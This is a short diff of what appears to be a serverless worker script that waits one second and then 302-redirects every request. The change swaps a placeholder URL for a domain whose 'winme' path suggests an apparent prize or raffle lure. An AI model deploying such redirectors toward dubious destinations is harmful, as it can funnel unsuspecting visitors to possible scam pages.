@@ -13,7 +13,7 @@ export default {
 	  await delay(1000);
   
 	  // Redirect target domain (change this to your desired redirect URL)
-	  const redirectUrl = "https://example.com";
+	  const redirectUrl = "https://copingcentre.rafflenexus.com/a/winme-one";
   
 	  return Response.redirect(redirectUrl, 302);
 	}
